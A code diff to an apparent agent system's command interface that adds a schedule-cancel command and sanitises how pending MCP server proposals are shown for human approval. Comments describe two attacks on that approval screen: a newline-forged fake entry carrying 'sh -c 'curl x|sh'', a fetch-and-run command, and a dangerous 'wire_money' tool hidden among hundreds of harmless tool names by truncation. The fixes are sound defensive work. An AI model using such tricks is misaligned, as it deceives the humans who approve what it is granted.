@@ -530,10 +530,27 @@ async def _schedule_command(args: str, *, bus: BusClient, ledger: LedgerClient, 
     `percept.time.scheduled`. Nothing in the entire system ever
     published that message, so none of it could be reached -- a finished
     subsystem with no door. This is the door.
+
+    The cancel half stayed shut a while longer. `Scheduler.
+    _on_schedule_cancel` is just as complete -- it appends
+    `schedule.cancelled`, marks the projection, and cancels the armed
+    timer -- and `_schedule_list` below already drops a cancelled id
+    from its listing, but `system.schedule.cancel` was published by
+    nothing in the tree (scan, 2026-09-10). A `schedule every 1h ...`
+    therefore had no off switch at all, and since the Kernel replays
+    `SCHEDULE_STREAM` on boot, a restart did not stop it either: it
+    fired every hour for the life of the installation. `schedule cancel
+    <id>` is that half's door.
     """
     args = (args or "").strip()
     if not args:
         return await _schedule_list(ledger)
+
+    # The whole first word, not a prefix: `schedule cancelthing` is a
+    # missing delay, not a cancel of `thing`.
+    head, _, rest = args.partition(" ")
+    if head.lower() == "cancel":
+        return await _schedule_cancel(rest.strip(), bus=bus, ledger=ledger)
 
     recurring = False
     if args.lower().startswith("every "):
@@ -559,13 +576,14 @@ async def _schedule_command(args: str, *, bus: BusClient, ledger: LedgerClient, 
     return Outcome(f"scheduled {when}: {label}  ({schedule_id})", exit_repl=False)
 
 
-async def _schedule_list(ledger: LedgerClient) -> Outcome:
-    try:
-        events = await ledger.read(SCHEDULE_STREAM)
-    except Exception as exc:  # noqa: BLE001
-        return Outcome(f"could not read the schedule: {exc!r}", exit_repl=False)
+async def _live_schedules(ledger: LedgerClient) -> dict[str, dict]:
+    """Every schedule that is armed right now, id -> its `added` payload.
+
+    One reader for `schedule` and `schedule cancel`, so the two can
+    never disagree about what is live.
+    """
     live: dict[str, dict] = {}
-    for event in events:
+    for event in await ledger.read(SCHEDULE_STREAM):
         payload = event.payload or {}
         schedule_id = str(payload.get("schedule_id") or "")
         if not schedule_id:
@@ -574,6 +592,39 @@ async def _schedule_list(ledger: LedgerClient) -> Outcome:
             live[schedule_id] = payload
         elif event.type == "schedule.cancelled":
             live.pop(schedule_id, None)
+    return live
+
+
+async def _schedule_cancel(schedule_id: str, *, bus: BusClient, ledger: LedgerClient) -> Outcome:
+    """`schedule cancel <id>` -- the only producer of `system.schedule.cancel`.
+
+    The id is checked against the live listing first. Publishing a
+    cancel for an id the Kernel does not hold is not an error there --
+    `_on_schedule_cancel` appends the record and finds no timer to
+    cancel -- so a typo would otherwise be answered with a cheerful
+    "cancelled" and nothing would have stopped.
+    """
+    schedule_id = (schedule_id or "").strip()
+    if not schedule_id:
+        return Outcome("cancel needs an id -- bare `schedule` lists them.", exit_repl=False)
+    try:
+        live = await _live_schedules(ledger)
+    except Exception as exc:  # noqa: BLE001
+        return Outcome(f"could not read the schedule: {exc!r}", exit_repl=False)
+    if schedule_id not in live:
+        near = difflib.get_close_matches(schedule_id, sorted(live), n=3, cutoff=0.4)
+        hint = f"; did you mean {', '.join(near)}?" if near else " -- bare `schedule` lists them"
+        return Outcome(f"nothing scheduled with id {schedule_id!r}{hint}", exit_repl=False)
+    await bus.publish(bus.new(topics.SYSTEM_SCHEDULE_CANCEL, {"schedule_id": schedule_id}))
+    return Outcome(f"cancelled {schedule_id}: {live[schedule_id].get('label', '')}".rstrip(": "),
+                   exit_repl=False)
+
+
+async def _schedule_list(ledger: LedgerClient) -> Outcome:
+    try:
+        live = await _live_schedules(ledger)
+    except Exception as exc:  # noqa: BLE001
+        return Outcome(f"could not read the schedule: {exc!r}", exit_repl=False)
     if not live:
         return Outcome("nothing scheduled. `schedule 15m <label>` or `schedule every 1h <label>`.",
                        exit_repl=False)
@@ -1125,6 +1176,29 @@ def _mcp_server_toml_block(proposal: dict) -> str:
     return "\n".join(lines) + "\n"
 
 
+#: How many names of a granted-tool or wanted-secret list to print.
+_MCP_LIST_SHOWN = 12
+
+
+def _named_list(names: list[str]) -> str:
+    """The names, capped BY COUNT, saying how many are not shown.
+
+    `one_safe_line(", ".join(names))` cut the joined string at 200
+    characters and ended it with an ellipsis that says nothing. A
+    proposal declaring 200 read-only tools with `wire_money` at position
+    150 rendered as twelve `read_thing_NNN` and a `…`, so the field
+    added to show what an approval grants hid it again -- silently, and
+    at the proposer's choice of ordering (observer, 2026-09-10). A
+    truncation the reader cannot see the size of is the same failure as
+    no field at all.
+    """
+    shown = [render_mod.one_safe_line(name, limit=60) for name in names[:_MCP_LIST_SHOWN]]
+    hidden = len(names) - len(shown)
+    if hidden > 0:
+        shown.append(f"...and {hidden} more NOT SHOWN -- approving grants all {len(names)}")
+    return ", ".join(shown)
+
+
 async def _mcp_command(args: str, *, bus: BusClient, ledger: LedgerClient, clock) -> Outcome:
     parts = args.split(None, 1)
     sub = parts[0] if parts else ""
@@ -1166,8 +1240,19 @@ async def _mcp_command(args: str, *, bus: BusClient, ledger: LedgerClient, clock
     if pending:
         lines.append(f"{len(pending)} pending MCP server proposal(s):")
         for proposal_id, proposal in pending.items():
-            command_line = " ".join([proposal.get("command", ""), *proposal.get("args", [])])
-            lines.append(f"  {proposal_id}  {proposal.get('name', '')}  ({command_line})")
+            # Everything on this line is text the PROPOSER wrote, and
+            # only `reason` was sanitised. A newline in `name` forged a
+            # whole extra listing entry -- `fs\n  99999999  evil  (sh -c
+            # 'curl x|sh')` printed as two proposals, the second one
+            # entirely invented, and pushed the real proposal's own
+            # command and reason under it; an escape in `command`
+            # cleared the screen (observer, 2026-09-10). That is the
+            # same padding attack `one_safe_line` was applied to
+            # `reason` for, on the fields that say WHICH server this is.
+            command_line = render_mod.one_safe_line(
+                " ".join([proposal.get("command", ""), *proposal.get("args", [])]))
+            name = render_mod.one_safe_line(str(proposal.get("name", "")), limit=60)
+            lines.append(f"  {proposal_id}  {name}  ({command_line})")
             lines.append(f"    reason: {render_mod.one_safe_line(proposal.get('reason', ''))}")
             # The two fields that decide what approving this GRANTS, and
             # neither was shown. `read_only_tools` is not a label:
@@ -1182,11 +1267,10 @@ async def _mcp_command(args: str, *, bus: BusClient, ledger: LedgerClient, clock
             granted = [str(t) for t in (proposal.get("read_only_tools") or ())]
             if granted:
                 lines.append("    GRANTS (Guardian never gates these, even when locked): "
-                             + render_mod.one_safe_line(", ".join(granted)))
+                             + _named_list(granted))
             wanted = [str(k) for k in (proposal.get("env_keys") or ())]
             if wanted:
-                lines.append("    wants these secrets: "
-                             + render_mod.one_safe_line(", ".join(wanted)))
+                lines.append("    wants these secrets: " + _named_list(wanted))
         lines.append("  `mcp approve <id>` or `mcp reject <id> [reason]`")
     else:
         lines.append("no pending MCP server proposals")
